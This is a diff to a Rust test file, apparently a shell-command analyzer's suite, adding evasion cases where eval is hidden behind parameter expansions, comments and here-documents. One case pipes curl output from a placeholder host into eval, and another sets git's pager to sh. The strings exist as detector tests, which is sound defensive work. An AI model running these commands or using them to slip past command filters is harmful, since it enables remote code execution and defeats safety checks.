@@ -5435,6 +5435,12 @@ fn issue_989_parameter_operators_in_the_command_word_are_unseen_code() {
         "c=eval; $=c echo hi",
         "c=eval; $~c echo hi",
         "c=ev; cal=echo; $c$'al' echo hi",
+        // Review 2: a `((` in a comment or here-document is not
+        // arithmetic, and the lines after it are code.
+        "c=; : # ((\n${c:-eval} $PAYLOAD\n#))",
+        "c=; x=$(curl -s https://x.example); : # $((\n${c:-eval} $x\n#))",
+        "c=; cat <<EOF\n((\nEOF\n${c:-git} config core.pager sh\n#))",
+        "set -- 1 2 3 4 5 6 7 8 9 eval; ${10} echo hi",
         // Not arithmetic: bash reads `((...) )` as nested subshells.
         "c=eval; ((${c:-eval} echo hi) )",
         "sh -c 'c=eval; ${c:-eval} echo hi'",
